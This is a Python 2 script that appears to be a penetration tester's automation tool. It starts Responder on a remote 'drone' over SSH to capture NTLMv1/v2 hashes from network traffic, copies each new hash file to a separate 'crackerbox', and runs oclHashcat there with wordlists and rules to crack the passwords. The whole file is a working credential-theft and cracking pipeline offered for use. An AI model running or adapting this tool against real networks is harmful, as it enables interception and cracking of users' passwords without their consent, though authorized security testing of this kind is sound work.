#!/usr/bin/env python

from scp import SCPClient
import netifaces
import string
import multiprocessing
import random
import paramiko
import getpass
import re
import time
import os
import signal
import trollius
import argparse
import sys
import subprocess

def parse_args():
	#Create the arguments
    parser = argparse.ArgumentParser()
    #parser.add_argument("-d", "--droneip", help="Enter the drone IP, should be 10.120.x.4")
    parser.add_argument("-c", "--crackerip", help="Enter the crackbox IP")
    return parser.parse_args()

def get_dronevpn_ips():
    '''
    Get the drone vpn ip address
    '''
    for intf in netifaces.interfaces():
        for link in netifaces.ifaddresses(intf)[netifaces.AF_INET]:
            ip = link['addr']
            # Drone VPN subnets: 10.120.*.*
            if ip.startswith('10.120.'):
                localip = ip
                localip_split = localip.split('.')
                droneip = '.'.join(localip_split[:3])+'.4'
                return localip, droneip

def launch_responder(droneip, d_ssh):
    '''
    Launches Responder on the drone in a screen session
    '''
    # Open Responder in a screen session
    cmd = 'screen -S responder -dm python /opt/Responder/Responder.py -I eth0 -wf'
    print '[*] Running on drone: {}'.format(cmd)
    stdin, stdout, stderr = d_ssh.exec_command(cmd)
    return (stdin, stdout, stderr)

def get_cracker_creds():
    '''
    Asks the user for crackerbox login and password
    '''
    user = raw_input('[*] LDAP username for crackerbox: ')
    pw = getpass.getpass()
    return user, pw

def get_drone_creds():
    '''
    Asks user for the drone ssh login name and password
    '''
    user = raw_input('[*] Drone ssh login name: ')
    pw = getpass.getpass()
    return user, pw

def parse_resp_output(d_ssh):
    '''
    Cycles through /opt/Responder/logs/ to collect hash files and returns all it sees
    '''
    remote_hash_files = []
    stdin, stdout, stderr = d_ssh.exec_command('ls /opt/Responder/logs')
    out = stdout.readlines()
    for x in out:
        x = x.strip()
        if 'NTLMv' in x:
            remote_hash_files.append(x)

    return remote_hash_files

def ssh_client(server, port, user, pw):
    '''
    Creates the SSH client using paramiko
    '''
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    # Auto add host keys to known_keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server, port, user, pw)
    except paramiko.AuthenticationException:
        sys.exit('[-] Authentication failed')
    return client

def make_hashcat_cmd(hash_file, user):
    '''
    Creates the hashcat cmd to be run on the crackerbox
    '''
    ran_str = ''.join(random.choice(string.letters) for x in range(5))
    identifier = user+'-'+ran_str
    hashcat  = '/opt/oclHashcat-1.36/oclHashcat64.bin --session {}'.format(identifier)
    hashcat += ' -m {} '
    hashcat += '-o {} /tmp/{} /opt/wordlists/* -r /opt/oclHashcat-1.36/rules/best64.rule'.format(identifier, hash_file)
    match = re.match('SMB-NTLM(v1|v2)', hash_file)
    if match:
        hashtype = match.group()
        if hashtype == 'SMB-NTLMv1':
            hashcat = hashcat.format('5500')
            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
        elif hashtype == 'SMB-NTLMv2':
            hashcat = hashcat.format('5600')
            screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
        else:
            return

        print '[+] Running on crackerbox:'
        print '    {}'.format(screen)
        return screen

def find_cracked_hashes(ssh, identifier):
    '''
    Read the .pot hashcat files for cracked hashes
    '''
    found = False
    while found == False:
        cmd = 'cat {}'.format(identifier)
        stdin, stdout, stderr = ssh.exec_command(cmd)
        print ':', stdout.read()

def launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent):
    '''
    Grab hashes off drone then put them on the crackerbox
    '''
    sent_hashes = []
    for u in unsent:
        print '[+] New hash found! Downloading locally: {}'.format(u)
        # scp the files from the drone to the local machine
        #          remote path              local path
        d_scp.get('/opt/Responder/logs/'+u, os.getcwd()+'/'+u)
        # scp the hashes from the local machine to the crackerbox
        #         local path          remote path
        c_scp.put(os.getcwd()+'/'+u, '/tmp/'+u)
        hashcat_cmd = make_hashcat_cmd(u, c_user)

        # Just in case hashcat_cmd is none we still want to say we sent the hash over
        # so the script doesn't continually think we haven't seen that file before
        if hashcat_cmd:
            # Execute the screen session on crackerbox
            stdin, stdout, stderr = c_ssh.exec_command(hashcat_cmd)
        sent_hashes.append(u)

    return sent_hashes

def main(args):

    # Root check
    if os.geteuid() != 0:
        sys.exit('[-] Run as root')
    if not args.crackerip:
        sys.exit('[-] Use: ./autoresp.py -c <crackerbox IP address>')

    hash_files = []
    sent_hashes = []
    identifiers = []

    raw_input('[*] Hit [Enter] when you are connected to both the drone VPN and the Coalfire network')
    localip, droneip = get_dronevpn_ips()

    # Setup cracker scp
    c_user, c_pw = get_cracker_creds()
    c_ssh = ssh_client(args.crackerip, 22, c_user, c_pw)
    c_scp = SCPClient(c_ssh.get_transport())

    # Setup drone scp
    d_user, d_pw = get_drone_creds()
    d_ssh = ssh_client(droneip, 22, d_user, d_pw)
    d_scp = SCPClient(d_ssh.get_transport())

    #Launch responder on drone, rspndr = (stdin, stdout, stderr)
    rspndr = launch_responder(droneip, d_ssh)

    # Check for new hashes and send them off
    try:
        while 1:
            # Check for new hashes in remote /opt/Responder/logs dir
            remote_hash_files = parse_resp_output(d_ssh)
            for h in remote_hash_files:
                if h not in hash_files:
                    hash_files.append(h)
            unsent = [h for h in hash_files if h not in sent_hashes]
            sent_hashes += launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent)
            time.sleep(1)
#
    except KeyboardInterrupt:
        print '[*] Killing drone Responder session'
        d_ssh.exec_command("ps aux | grep -i 'screen -s responder' | grep -v grep | awk '{print $2}' | xargs kill -9")

main(parse_args())
